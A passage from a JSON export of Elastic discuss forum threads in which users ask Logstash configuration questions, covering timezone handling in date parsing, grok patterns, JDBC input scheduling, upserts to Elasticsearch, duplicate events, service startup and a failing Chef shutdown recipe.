work-around, but it's not pretty. Take the PDT ISO8601 string returned from \"mutate\"/\"convert\" above, and replace the \"Z\" UTC designator with \"+02:00\", to account for the PDT -> CDT timezone offset: filter { mutate { convert => { \"job_timestamp\" => \"string\" } gsub => [\"job_timestamp\", \"Z\", \"+02:00\"] } date { match => [\"job_timestamp\", \"ISO8601\"] target => \"new_timestamp\" } prune { whitelist_names => [ \"job_timestamp\", \"new_timestamp\", \"tags\" ] } } Results in: { \"new_timestamp\" => 2020-03-09T06:42:59.000Z, \"job_timestamp\" => \"2020-03-09T08:42:59.000+02:00\" } Finally! \"new_timestamp\" is now correct. We mutated the original DATETIME into a string with the correct timezone (seen in \"job_timestamp\" above), converted that string back into a datetime with the \"date\" plugin, and assigned that into the new \"new_timestamp\" field. (If I wanted to set \"job_timestamp\" to that value instead, I'd just set \"job_timestamp\" as the \"target\" of \"date\".) But yeah, just being able to directly set the timezone for incoming DATETIMEs would be much better, if you know their timezone, and you can't convince the data producer to add the timezone offset to the data itself (possibly for fear of messing up existing schemas).",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "deb54456-e705-4c1b-bc84-165c0dc646ed",
    "url": "https://discuss.elastic.co/t/conditional-pipeline-logic/227390",
    "title": "Conditional Pipeline Logic",
    "category": [
      "Logstash"
    ],
    "author": "InfiniteLoops",
    "date": "April 9, 2020, 6:45pm April 11, 2020, 1:11am",
    "body": "Logstash with an input A sending to outputs B and C. If B or C fails everything becomes blocked. If the loss of data is acceptable is the below setup possible. So if a failure occurs in the first pipeline the system switches to using the second and if that fails then it tries the third. Three pipelines If{1. A - > B + C }else{ 2. A -> B }else 3. A -> C Other advice or solutions welcome on what to do in the first case if one of the outputs is blocked",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b501f1a1-225d-4c1b-97c4-da10e6c68e82",
    "url": "https://discuss.elastic.co/t/delete-and-insert-to-elastic-from-logstash/227399",
    "title": "Delete and insert to elastic from logstash",
    "category": [
      "Logstash"
    ],
    "author": "krishna_bhargav",
    "date": "April 9, 2020, 8:01pm",
    "body": "We have intraday updates to our records, so we need to delete and insert all child records. logstash output : This is not deleting and insert , it's insert or update. output { elasticsearch{ hosts => [ \"xxxxxx\" ] index => \"xxxxxx\" document_id => \"xxxxxx\" document_type => \"_doc\" user => xxxxx password => xxxxx action => \"update\" doc_as_upsert => \"true\" } } sample: initial data in elastic: \"keyInformation\" : { \"firmId\" : \"1\", \"entityType\" : \"HH\", \"entityId\" : \"1111\", \"lastUpdated\" : \"2020-04-09T16:08:17.181Z\", \"key\" : \"QA8_COMMON_101_HH_111\" }, \"associatedAccounts\" : [ { \"accountId\" : \"1\", }, { \"accountId\" : \"2\", }, { \"accountId\" : \"3\", } ] after intraday load it should remove 1,2,3 and add 3,4,5 \"associatedAccounts\" : [ { \"accountId\" : \"4\", }, { \"accountId\" : \"5\", }, { \"accountId\" : \"6\", } we can't remove entire document because there are other child objects that may not have changed. so we have to update only specific list.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "70e48804-189c-45e4-9900-52e4f6dd5dcd",
    "url": "https://discuss.elastic.co/t/jdbc-input-plugin-behavior-if-job-runs-longer-than-schedule-period-just-waits-until-next-schedule-time/227382",
    "title": "JDBC Input Plugin: Behavior if job runs longer than schedule period? Just waits until next schedule time?",
    "category": [
      "Logstash"
    ],
    "author": "Jonathan_Rice",
    "date": "April 9, 2020, 5:59pm",
    "body": "Say I give the JDBC Input Plugin a schedule to run every 5 minutes, but the Logstash job takes 6 minutes to run. Does the next job then run immediately, or does it wait until the next 5-minute wall-clock time is reached (i.e., it waits 4 minutes after the long 6-minute job finishes)? I presume it does the latter - just kicks off jobs according to the wall-clock scheduled times, if it is currently not running a job. Can someone confirm?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "64d29aae-2944-44f0-a63c-e7af3da1d405",
    "url": "https://discuss.elastic.co/t/mulitple-pipeline-with-common-output-file/226910",
    "title": "Mulitple pipeline with common output file",
    "category": [
      "Logstash"
    ],
    "author": "priya_yuvaraj",
    "date": "April 7, 2020, 1:48pm April 9, 2020, 5:32pm",
    "body": "Hi all, I need a help in the following logstash implementation. I am new to logstash. I am having multiple pipeline configured in pipeline.yml. All the pipelines have to send data to the same output file ( commonfile_data_time_with_seconds.log). 1. Is this thread safe ? Is there any other way to implement this ? Thank you",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c4ddad95-92a2-4679-84a1-bec6a8967544",
    "url": "https://discuss.elastic.co/t/duplicate-log-events-with-different-id-generated-by-logstash/227135",
    "title": "Duplicate log events with different _id generated by logstash",
    "category": [
      "Logstash"
    ],
    "author": "nityaraj06",
    "date": "April 8, 2020, 1:23pm April 9, 2020, 5:29pm",
    "body": "Hi, I am able to see duplicate log events with different _id generated by logstash in Kibana. Below is my logstash config. Could someone help me with this? input { file { path => \"E:/console-2020*.log\" sincedb_path => \"E:\\logstash\\logstash-7.6.0\\sincedb\\console-sincedb.txt\" type => \"consolelogs\" codec => multiline { pattern => \"%{WORD}%{SPACE}\\|%{SPACE}jvm%{SPACE}1%{SPACE}\\|%{SPACE}srvmain%{SPACE}\\|%{SPACE}%{YEAR}/%{MONTHNUM2}/%{MONTHDAY}%{SPACE}%{HOUR}:%{MINUTE}:%{SECOND}.%{SECOND}%{SPACE}\\|%{SPACE}at\" what => \"previous\" } } } filter { if \"DefaultSolrClientPool\" in [message] { drop { } } grok { } } } date { match => [\"newtimestamp\", \"yyyy/MM/dd HH:mm:ss.SSS\"] timezone => \"Europe/Stockholm\" target => \"@timestamp\" } } output { if [type] == \"consolelogs\" { elasticsearch { hosts => [\"<ip1>:9200\"] index => \"console-preprod-%{+YYYY.MM.dd}\" } } }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8f19a72f-3f16-4d2e-ab76-ccbf9ac916ab",
    "url": "https://discuss.elastic.co/t/problem-when-i-run-logstash-as-a-service/227312",
    "title": "Problem when i run logstash as a service",
    "category": [
      "Logstash"
    ],
    "author": "mimimike",
    "date": "April 9, 2020, 12:06pm April 9, 2020, 2:34pm April 9, 2020, 5:13pm",
    "body": "Hi everyone, I don't know why cannot run logstash as a service. If i run logstash in command line works well but when i run as a service appears the next error in status service: Apr 09 14:03:02 kafka02 logstash[60398]: 2012 down?: false Apr 09 14:03:02 kafka02 logstash[60398]: 2012 threads: 2 Apr 09 14:03:02 kafka02 logstash[60398]: 2012 thread: #Thread:0x209fe7 Apr 09 14:03:02 kafka02 logstash[60398]: 2012 thread_key: rufus_scheduler_2010 Apr 09 14:03:02 kafka02 logstash[60398]: 2012 work_threads: 1 Apr 09 14:03:02 kafka02 logstash[60398]: 2012 active: 1 Apr 09 14:03:02 kafka02 logstash[60398]: 2012 vacant: 0 Apr 09 14:03:02 kafka02 logstash[60398]: 2012 max_work_threads: 1 Apr 09 14:03:02 kafka02 logstash[60398]: 2012 mutexes: {} Apr 09 14:03:02 kafka02 logstash[60398]: 2012 jobs: 1 Meanwhile in logs file: [2020-04-09T14:02:25,448][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-09T14:02:25,540][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.1.1\"} [2020-04-09T14:02:45,474][INFO ][logstash.outputs.elasticsearch] Elasticsearch pool URLs updated {:changes=>{:removed=>, :added=>[http://ip:9200/]}} [2020-04-09T14:02:46,294][WARN ][logstash.outputs.elasticsearch] Restored connection to ES instance {:url=>\"http://ip:9200/\"} [2020-04-09T14:02:46,532][INFO ][logstash.outputs.elasticsearch] ES Output version determined {:es_version=>7} [2020-04-09T14:02:46,547][WARN ][logstash.outputs.elasticsearch] Detected a 6.x and above cluster: the type event field won't be used to determine the document _type {:es_version=>7} [2020-04-09T14:02:46,711][INFO ][logstash.outputs.elasticsearch] New Elasticsearch output {:class=>\"LogStash::Outputs::ElasticSearch\", :hosts=>[\"http://ip:9200\"]} [2020-04-09T14:02:46,763][INFO ][logstash.outputs.elasticsearch] Using default mapping template [2020-04-09T14:02:46,866][INFO ][logstash.javapipeline ] Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>2, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>250, :thread=>\"#<Thread:0x54e5324e run>\"} [2020-04-09T14:02:47,635][INFO ][logstash.outputs.elasticsearch] Attempting to install template {:manage_template=>{\"index_patterns\"=>\"logstash-\", \"version\"=>60001, \"settings\"=>{\"index.refresh_interval\"=>\"5s\", \"number_of_shards\"=>1}, \"mappings\"=>{\"dynamic_templates\"=>[{\"message_field\"=>{\"path_match\"=>\"message\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false}}}, {\"string_fields\"=>{\"match\"=>\"\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false, \"fields\"=>{\"keyword\"=>{\"type\"=>\"keyword\", \"ignore_above\"=>256}}}}}], \"properties\"=>{\"@timestamp\"=>{\"type\"=>\"date\"}, \"@version\"=>{\"type\"=>\"keyword\"}, \"geoip\"=>{\"dynamic\"=>true, \"properties\"=>{\"ip\"=>{\"type\"=>\"ip\"}, \"location\"=>{\"type\"=>\"geo_point\"}, \"latitude\"=>{\"type\"=>\"half_float\"}, \"longitude\"=>{\"type\"=>\"half_float\"}}}}}}} [2020-04-09T14:02:48,340][INFO ][logstash.javapipeline ] Pipeline started {\"pipeline.id\"=>\"main\"} [2020-04-09T14:02:49,483][INFO ][logstash.agent ] Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>} [2020-04-09T14:02:52,620][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} I don't understand the error. Could someone help me? Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "74a7ad20-d4c5-4994-b38d-653ee57b9f74",
    "url": "https://discuss.elastic.co/t/grok-create-an-array-not-a-string/227352",
    "title": "Grok create an array not a string",
    "category": [
      "Logstash"
    ],
    "author": "nico88",
    "date": "April 9, 2020, 2:56pm April 9, 2020, 4:12pm April 9, 2020, 4:14pm",
    "body": "Hello, I try to grok a tacacs authentification log file from tac plus. Ex of log line : 2020-04-09 16:13:26 +0200 10.2.0.163 test tty2 8.8.8.8 shell login succeeded This is my filter : filter { if [type] == \"Tacacs\" { if [log][file][path] == \"/var/log/tac_plus/authentication.log\" { grok { match => { \"message\" => \"%{YEAR}-%{MONTHNUM}-%{MONTHDAY} %{HOUR}:%{MINUTE}:%{SECOND} \\+0200 %{IP:destination.ip} %{USER:user.name}%{SPACE}(%{NOTSPACE}%{SPACE})?%{IP:source.ip} shell login %{WORD:tacacs.outcome}(%{GREEDYDATA})?\" } } if [tacacs.outcome] == \"succeeded\" { mutate { add_field => { \"event.outcome\" => \"success\" } } } else { mutate { add_field => { \"event.outcome\" => \"failure\" } } } mutate { add_field => { \"event.category\" => \"authentication\" } } } } } I don't know why but I get value as array: \"destination.ip\": [ \"10.2.0.163\", \"10.2.0.163\" ], \"event.outcome\": [ \"success\", \"failure\" ], \"event.category\": [ \"authentication\", \"authentication\" ], \"source.ip\": [ \"8.8.8.8\", \"8.8.8.8\" ], Can you help me to understand where is my problem ? Thank you for your help",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a2223cdd-d750-41b6-a246-7cb55c998306",
    "url": "https://discuss.elastic.co/t/out-of-memory-error-with-logstash-7-6-2/227286",
    "title": "Out of memory error with logstash 7.6.2",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 9, 2020, 9:17am April 9, 2020, 3:31pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "239e09e1-b212-46bf-93ae-21f04069c00e",
    "url": "https://discuss.elastic.co/t/prevent-the-loss-of-existing-fields-while-using-document-id-of-elasticsearch-output-plugin/227327",
    "title": "Prevent the loss of existing fields while using document_id of elasticsearch output plugin",
    "category": [
      "Logstash"
    ],
    "author": "oula_oula",
    "date": "April 9, 2020, 1:20pm April 9, 2020, 2:30pm April 9, 2020, 3:17pm",
    "body": "Hi, I need to inject multiple logs in a common document according to a specific field value. So, I specify document_id's value in elasticsearch plugin output. But instead of adding fields after parsing logs it deletes existing fields (made from former logs) and add the current new fields, so I lose information. Althought my fields has not the same name so it can't do overwritting. How to prevent from deleting existing fields ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a77a9310-d129-4776-a417-5c6ce6c8882c",
    "url": "https://discuss.elastic.co/t/dissect-json-fields-in-a-specific-field/227301",
    "title": "Dissect json fields in a specific field",
    "category": [
      "Logstash"
    ],
    "author": "oula_oula",
    "date": "April 9, 2020, 11:03am April 9, 2020, 11:29am",
    "body": "Hi, I would like to know if it is possible to use the json parser to add thes fields result in a chosen field instead of just in the \"_source\" field. for example: message = \"{'step': 1, 'completed': true}\" filter{ mutate: { add_field: \"json_result\" => { json :{ source => \"message\"}} } } ??",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e986c89a-69e0-4c87-9fdd-35d0980b423c",
    "url": "https://discuss.elastic.co/t/same-grok-filter-for-two-somehow-similar-logs/227242",
    "title": "Same Grok Filter for two somehow similar logs",
    "category": [
      "Logstash"
    ],
    "author": "Ismail_Zam_Zam",
    "date": "April 9, 2020, 5:48am April 9, 2020, 10:45am April 9, 2020, 10:51am",
    "body": "type=EXECVE msg=audit(1585994474.430:1397): argc=5 a0=\"script\" a1=\"-q\" a2=\"-c\" a3=6563686F2044415441 a4=\"file_to_write\" type=EXECVE msg=audit(1585994474.430:1397): argc=2 a0=\"apt-get\" a1=\"install\" I want to parse these logs by single grok filter. The First log have 5 arguments and the second log has 2 arguments. One way is doing it by using two grok filters but if there is a good method other then that, please guide me. I also use the Logical 'OR' after the second argument in the filter but the filter only parse the log till the end of second argument and ignore the other. type=%{WORD:[type]} msg=audit\\(%{NUMBER}:%{NUMBER:[sequence]}\\): (%{GREEDYDATA})?a0=\\\"%{DATA:[a0]}\\\"( %{GREEDYDATA})? (%{GREEDYDATA})?a1=\\\"%{DATA:[a1]}\\\"( %{GREEDYDATA})? (%{GREEDYDATA})?a2=\\\"%{DATA:[a2]}\\\"( %{GREEDYDATA})? Kindly answer it as soon as possible. Thanks in advance!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f29d0078-a1fa-494b-9b50-2a45c6c9cfde",
    "url": "https://discuss.elastic.co/t/should-we-be-allowed-to-use-http-filter-to-get-log-data/227298",
    "title": "Should we be allowed to use http filter to get log data?",
    "category": [
      "Logstash"
    ],
    "author": "SHINRA",
    "date": "April 9, 2020, 10:45am",
    "body": "Problem: We need to dynamically change http request URL to fetch data. I figured that one cannot simply change URL dynamically; instead I found a few ways to go around it: exec input filter with curl and some scripting dynamically changing our .conf file with auto-reload option (both of above methods are dependent on external shell script) getting our parameters from a different service through http_poller and then getting the actual data through http filter plugin. Why do we need to do this? Similar to this case => Adding 1 day to the date but can't use ruby because it's used in the input. The config file roughly looks like this: input { http_poller{ # will return just simple json with few parameters url => \"http://url-to-my-parameters/fetch/parameters\" } } filter { mutate { add_field => { \"parameter\" => \"%{[data][parameter]}\" } } http { # will return thousands of data items in JSON url => \"http://url-to-actual-data/data?parameter=%{parameter}\" } } and then filter, output and so on. This seems to do what I want to get done but I feel uneasy about this approach as it feels like an anti pattern to the idea of log data pipeline. Also, unlike http input plugin it doesn't leave the response headers on @metadata. Has anybody tried similar approach in production? Is there better ways/recommendations to get this done? Thanks in advance.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "aa981455-4452-41fb-a40f-bb73c2afcb9e",
    "url": "https://discuss.elastic.co/t/how-to-extract-only-required-content-from-a-logfile-and-send-it-to-filter-parsing-in-logstash-config-file/226644",
    "title": "How to extract only required content from a logfile and send it to filter parsing in logstash config file",
    "category": [
      "Logstash"
    ],
    "author": "poddraj",
    "date": "April 6, 2020, 8:22am April 9, 2020, 10:39am",
    "body": "Hi All, I am pretty new to Logstash and I have an unstructured C++ log file from which I want to send only selected content of log to kafka topic from logstash. Below is the sample log file, can someone help with the config file that helps to achieve it. I want the content which is within the xml tags (<DELPHI_REQUEST> ... </DELPHI_REQUEST> & <DELPHI_RESPONSE> .... </DELPHI_RESPONSE>) 12/20 00:02:07.47 ft_acce(28395)786 LogThread: TRDB_FT queue = 0 ( 0) [ 17, 0] XML 12/20 00:02:07.47 ft_acce(28395)786 LogThread: HNMNG_FT queue = 0 ( 0) [ 23, 0] XML 12/20 00:02:42.00 dte.cpp(28367)1914 IDL::ProcessRequestXML: DTE_KEY: Queueing request: SID:A232000005-, PERSISTID:47, WPID:0, SYS:NFAM, EMPID:, CMD:CLOSE_SESSION, PRIORITY:Default, TIMEOUT:300 sec 12/20 00:02:42.00 dte.cpp(28367)563 PendingResponseCount: Set(47) -> 1 12/20 00:02:42.00 priorit(28367)422 PutOnQueue: 47, \"\", defWait = 0, minWait = 0, timeoutInterval = 300 12/20 00:02:42.00 priorit(28367)457 PutOnQueue: Calling DequeueWakeUp() ... 12/20 00:02:42.00 priorit(28367)916 DequeueWakeUp: NULL 12/20 00:02:42.00 priorit(28363)703 Dequeue: return(47) 12/20 00:02:42.00 dte.cpp(28363)2386 ProcessRequest: DTE_KEY: Received XML request: SID:A232000005-, PERSISTID: 47, WPID:72000002, PRIORITY:Default, TIMEOUT:300 sec, returnIOR: IOR:010000001300000049444c3a4f7373526573756c74733a312e30000001000000000000007000000001010145100000003131332e3134302e3230372e31323900b78a203c1b00000014010f0052535459b6fb5d642d010002000000010000000300000056020000000000000008000000010800d0004f41540100000018000000010200d00100010001000000010001050901010000000000 <DELPHI_REQUEST> <CTLHDR> <DIPVER>5.0</DIPVER> <DOMAIN>FTTP</DOMAIN> <SYS_NAME>NFAM</SYS_NAME> <DTIMEOUT>5</DTIMEOUT> <ACKMNTS>N</ACKMNTS> <MGRID>NFAM</MGRID> </CTLHDR> <REQUEST> <SID>A232000005-</SID> <REQUIRED> <COMMAND>CLOSE_SESSION</COMMAND> </REQUIRED> </REQUEST> </DELPHI_REQUEST> 12/20 06:40:51.37 dte.cpp(27102)3557 LogThread: Request queue = 0 12/20 06:40:51.37 dte.cpp(27102)3558 LogThread: Response queue = 0 12/20 06:40:51.37 ft_acce(27102)771 LogThread: FT response queue = 0 12/20 06:40:51.37 ft_acce(27102)773 LogThread: FT timeout queue = 0 12/20 06:42:10.90 dte.cpp(27087)1914 IDL::ProcessRequestXML: DTE_KEY: Queueing request: SID:, PERSISTID:1, WPID:76297808, SYS:VMOBILE, EMPID:, CMD:GET_HISTORY, PRIORITY:Demand, TIMEOUT:430 sec 12/20 06:42:10.90 dte.cpp(27087)563 PendingResponseCount: Set(1) -> 1 12/20 06:42:10.90 priorit(27087)422 PutOnQueue: 1, \"\", defWait = 0, minWait = 0, timeoutInterval = 430 12/20 06:42:10.90 priorit(27087)457 PutOnQueue: Calling DequeueWakeUp() ... 12/20 06:42:10.90 priorit(27087)916 DequeueWakeUp: NULL 12/20 06:42:10.90 priorit(27063)703 Dequeue: return(1) 12/20 06:42:10.90 dte.cpp(27063)2386 ProcessRequest: DTE_KEY: Received XML request: SID:, PERSISTID: 1, WPID:76297808, PRIORITY:Demand, TIMEOUT:430 sec, returnIOR: IOR:010000001300000049444c3a4f7373526573756c74733a312e30000001000000000000007000000001010150100000003131332e3134302e3230372e3132390071a900001b00000014010f00525354af42fc5d02c20a000200000001000000030000004402000000000000000800000001000000004f41540100000018000000010400680100010001000000010001050901010000000000 <DELPHI_REQUEST> <CTLHDR> <DIPVER>5.0</DIPVER> <DOMAIN>FTTP</DOMAIN> <SVC_ID>||null|EAST|GetFIOSTestHistoryFromDelphi|FTTP</SVC_ID> <SVC_NAME>TEST</SVC_NAME> <SYS_ID>WEBIFAS</SYS_ID> <ATTACHMENTS>Y</ATTACHMENTS> <SYS_NAME>VMOBILE</SYS_NAME> <TSTMODE>CACHE</TSTMODE> <USR_TYPE>NT</USR_TYPE> <DTIMEOUT>PT420S</DTIMEOUT> <REQ_TIME_STAMP>2019-12-20T06:42:10Z</REQ_TIME_STAMP> <MGRID>NFAM</MGRID> <TRANID>2019122076297808</TRANID> <WPID>76297808</WPID> <DTIMEOUTSEC>430</DTIMEOUTSEC> <PRIORITY>Demand</PRIORITY> </CTLHDR> <REQUEST> <RESEARCH_MAP>NNY</RESEARCH_MAP> <USER_MAP>NNNNNYNN</USER_MAP> <START_TIME/> <END_TIME/> <NETYPE>BHR</NETYPE> <TN>4104857286</TN> <TSTCOND>S</TSTCOND> <REQUIRED> <SVCTYPE>VOICE</SVCTYPE> <COMMAND>GET_HISTORY</COMMAND> <EMP_ID/> <WK_TYPE>I</WK_TYPE> <JOB_TYPE>M</JOB_TYPE> </REQUIRED> </REQUEST> </DELPHI_REQUEST> 12/20 06:42:10.91 dte.cpp(27063)2449 ProcessRequest: DTE_KEY: Created new session: SID:A697000000-, SYS:VMOBILE, EMPID: 12/20 06:42:10.91 dte.cpp(27063)2523 ProcessRequest: persistID: 1, assigned to new session A697000000- 12/20 06:42:10.92 fios.cp(27063)9027 FIOSSession::DecodeAndValidate() SID:A697000000- Clearing the session 12/20 07:46:23.63 priorit(27066)916 DequeueWakeUp: NULL 12/20 07:46:23.63 priorit(27041)703 Dequeue: return(697000010) 12/20 07:46:23.63 ft_acce(27041)1836 FTResponseThread: DTE_KEY: SID:A697000004-, WPID:76297812, COMMAND:MANAGE-LR-CACHE-COMMAND, FT:CACHE_FT, REQID:697000010 12/20 07:46:23.63 ft_acce(27041)1845 DTE_KEY: SID:A697000004-, WPID:76297812, COMMAND:MANAGE-LR-CACHE-COMMAND, REQID:697000010, <DELPHI_RESPONSE> <CTLHDR> <SVC_NAME>TEST</SVC_NAME> <DOMAIN>FTTP</DOMAIN> <SYS_NAME>DTI_EXPRESS</SYS_NAME> <SVC_ID>|3211039005005911000|HEM</SVC_ID> <SYS_ID>10-118-224-197.ebiz.verizon.com</SYS_ID> <DTIMEOUTSEC>2</DTIMEOUTSEC> <STATMSG>Y</STATMSG> <MULTRES>Y</MULTRES> <ATTACHMENTS>Y</ATTACHMENTS> <REQ_TIME_STAMP>2019-12-20T07:46:20Z</REQ_TIME_STAMP> <PRIORITY>Demand</PRIORITY> <MGRID>697000010</MGRID> <WPID>76297812</WPID> </CTLHDR> <REQUEST> <COMMAND>RETRIEVE_CACHE_INFO</COMMAND> <EMP_ID>SIVARA2</EMP_ID> <DURATION>86400</DURATION> <WK_TYPE>M</WK_TYPE> <ATTRIBUTES> <NUM_ATTRS>2</NUM_ATTRS> <ATTRIBUTE> <ATTR_NAME>CACHE_TYPE</ATTR_NAME> <ATTR_VAL>FTTP_PATH_INFO</ATTR_VAL> </ATTRIBUTE> <ATTRIBUTE> <ATTR_NAME>KEY</ATTR_NAME> <ATTR_VAL>7815196969</ATTR_VAL> </ATTRIBUTE> </ATTRIBUTES> </REQUEST> <RESULTS> <RETC>1010</RETC> <RSTYPE>E</RSTYPE> <INFOMSG>Cache data not found</INFOMSG> <ERRMSG>Cache data not found</ERRMSG> <RESP_TIME_STAMP>2019-12-20T07:46:23Z</RESP_TIME_STAMP> </RESULTS> </DELPHI_RESPONSE> 12/20 07:46:23.63 ft_acce(27041)1854 FTResponseThread: Generating dequeue event: CACHE_FT 12/20 07:46:23.63 priorit(27041)916 DequeueWakeUp: CACHE_FT 12/20 07:46:23.63 dte.cpp(27041)3104 ProcessCommandResults: DTE_KEY: SID:A697000004-, FIOS-PATHINFO-CACHE-OUTAGE-STATE::MANAGE-LR-CACHE-COMMAND completed (1/1) 12/20 07:46:23.63 dte.cpp(27041)3144 ProcessCommandResults: DTE_KEY: SID:A697000004-, transition FIOS-PATHINFO-CACHE-OUTAGE-STATE -> FIOS-TEST-HISTORY-ARCHIVE-STATE 12/20 07:46:23.63 fios_re(27041)4537 FIOSRemarks::PrepareFinalResponse() WPID:76297812 using FIOS-RESULT-FCS=ALL 12/20 07:46:23.63 fios.cp(27041)6655 GetNeedSummaryByCommand WPID: 76297812, VOICE+GET_TOPOLOGY+SUMMARY = 0 12/20 07:46:23.63 fios.cp(27041)28559 PreparePCAN() WPID:76297812 prepared PCAN=7815196969 12/20 07:46:23.63 dte.cpp(27041)3276 RunState: DTE_KEY: SID:A697000004-, FIOS-TEST-HISTORY-ARCHIVE-STATE => ARCHIVE-TEST-HISTORY-COMMAND 12/20 07:46:23.63 ft_acce(27041)991 QueueCommand: DTE_KEY: SID:A697000004-, WPID:76297812, COMMAND:ARCHIVE-TEST-HISTORY-COMMAND, FT:TRDB_FT (XML), OSSID:TRDB, REQID:697000011, PRIORITY:Demand, TIMEOUT:15 sec",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "978318fc-29dd-4984-bae7-e63756e7aeac",
    "url": "https://discuss.elastic.co/t/error-executing-action-run-on-resource-bash-shutdown-logstash/227224",
    "title": "Error executing action `run` on resource 'bash[shutdown logstash]'",
    "category": [
      "Logstash"
    ],
    "author": "manoj123",
    "date": "April 9, 2020, 7:48am",
    "body": "Noticed an error on logstash server while running chef-client. Chef is failing due to this error \"Error executing action run on resource 'bash[shutdown logstash]' \" ` Recipe: tmo-logstash::default bash[logstash_fix_perms] action run execute \"bash\" \"/tmp/chef-script20200409-21785-s4tiv3\" bash[shutdown logstash] action run [execute] kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec] ================================================================================ Error executing action run on resource 'bash[shutdown logstash]' Mixlib::ShellOut::ShellCommandFailed Expected process to exit with [0], but received '1' ---- Begin output of \"bash\" \"/tmp/chef-script20200409-21785-wvayt7\" ---- STDOUT: STDERR: kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill - l [sigspec] ---- End output of \"bash\" \"/tmp/chef-script20200409-21785-wvayt7\" ---- Ran \"bash\" \"/tmp/chef-script20200409-21785-wvayt7\" returned 1 Cookbook Trace: /var/chef/cache/cookbooks/compat_resource/files/lib/chef_compat/monkeypatches/chef/runner .rb:78:in run_action' /var/chef/cache/cookbooks/compat_resource/files/lib/chef_compat/monkeypatches/chef/runner .rb:106:in block (2 levels) in converge' /var/chef/cache/cookbooks/compat_resource/files/lib/chef_compat/monkeypatches/chef/runner .rb:106:in each' /var/chef/cache/cookbooks/compat_resource/files/lib/chef_compat/monkeypatches/chef/runner .rb:106:in block in converge' /var/chef/cache/cookbooks/compat_resource/files/lib/chef_compat/monkeypatches/chef/runner .rb:105:in `converge' Resource Declaration: In /var/chef/cache/cookbooks/tmo-logstash/recipes/default.rb 36: bash 'shutdown logstash' do 37: action :run 38: code \"kill -9 $(pgrep -u logstash)\" 39: end 40: Compiled Resource: Declared in /var/chef/cache/cookbooks/tmo-logstash/recipes/default.rb:36:in `from_file' bash(\"shutdown logstash\") do action [:run] retries 0 retry_delay 2 default_guard_interpreter :default command \"shutdown logstash\" backup 5 returns 0 code \"kill -9 $(pgrep -u logstash)\" interpreter \"bash\" declared_type :bash cookbook_name \"tmo-logstash\" recipe_name \"default\" end Platform: x86_64-linux Recipe: filebeat::config service[filebeat] action start (up to date) Running handlers: Running handlers complete Chef Client failed. 4 resources updated in 40 seconds ` Can someone help me why this error is appearing.? Thanks Manoj Kumar`",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6ccfb95b-ee9e-4232-b357-69d8df5bb885",
    "url": "https://discuss.elastic.co/t/jdbc-input-plugin-extra-count-query-with-paging-disabled/227212",
    "title": "Jdbc_input_plugin : extra count query with paging disabled",
    "category": [
      "Logstash"
    ],
    "author": "deslauriersp",
    "date": "April 8, 2020, 9:37pm April 8, 2020, 11:34pm April 9, 2020, 3:20am",
    "body": "I am trying to setup a JDBC input plugin. I have turned off paging : jdbc_paging_enabled => false jdbc_page_size => 0 Yet, in the \"debug\" logs I can see SELECT count(*) \"COUNT\" FROM ( [my_query] ) \"T1\" FETCH NEXT 1 ROWS ONLY This is a problem for me, since the query will never return the same thing twice. Since Logstash does not work in cluster, we are trying to \"split\" the work at the one place all instances are accessing : the DB. We built a query that will return a different chunk everytime, and paging is handled in the DB size. Since each query will return a different result, you can understand why the extra \"count\" query is problematic The goal is to indexing X millions records, splitting the load across logstash nodes, and don't index anything twice. Is there a way to disable this extra \"count\" query?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9c05e43f-53e7-4529-a159-d41e04dd27ae",
    "url": "https://discuss.elastic.co/t/logstash-mapping/227198",
    "title": "Logstash Mapping",
    "category": [
      "Logstash"
    ],
    "author": "Antonio_Antovski",
    "date": "April 8, 2020, 7:44pm April 8, 2020, 7:23pm April 8, 2020, 7:44pm April 8, 2020, 11:26pm",
    "body": "Hello, I'm new to logstash, and while experimenting with it I faced some problems for which I need some help to solve them. I'm reading the data I want to put into ES, from MySQL db. I have created a template (with template_name, settings and mapping). When starting the logstash.service I get the following log messages: Using mapping template from {:path=>\"/etc/logstash/conf.d/my_mapping.json\"} Attempting to install template {...} Installing elasticsearch template to _template/logstash and I believe everything is ok with the installing, but after the data is being inserted into the index, the mapping isn't the same as the one provided in the template. The index has the default mapping. I've also tried first to create the index and put the mapping into it, but again, after I insert the data using logstash, it adds the default's mapping fields to the previously put mapping. Here's the template file: { \"template\": \"my_mapping\", \"mappings\": { \"properties\": { \"id\": { \"type\": \"keyword\" }, \"uuid\": { \"type\": \"keyword\" }, \"general_info\": { \"properties\": { \"first_name\": { \"type\": \"text\" }, \"last_name\": { \"type\": \"text\" }, \"gender\": { \"type\": \"text\" }, \"note\": { \"type\": \"text\" } } }, \"created_at\": { \"type\": \"date\" }, \"updated_at\": { \"type\": \"date\" }, \"last_contacted\": { \"type\": \"date\" } } } } I tried to insert the data: with / 